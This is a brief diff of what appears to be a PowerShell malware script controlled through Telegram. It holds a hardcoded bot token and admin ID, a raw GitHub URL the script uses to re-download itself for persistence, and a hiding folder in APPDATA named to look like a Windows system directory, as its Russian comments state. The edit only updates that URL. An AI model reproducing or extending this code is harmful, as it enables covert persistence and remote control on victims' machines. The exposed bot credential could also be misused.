@@ -2,7 +2,7 @@
 $token = "8220355086:AAFI1_k4FoKIF18FShkBn0yezO5dDldzs88"
 $admin_id = "6494641721"
 # Ссылка на этот же файл (RAW), чтобы он мог себя перекачать для закрепления
-$url_raw = "https://raw.githubusercontent.com/tidomail13719-art/safe-test-/main/test"
+$url_raw = "https://raw.githubusercontent.com/tidomail13719-art/safe-test-/refs/heads/main/test"
 
 # Пути для маскировки
 $dir = "$env:APPDATA\WindowsNT"
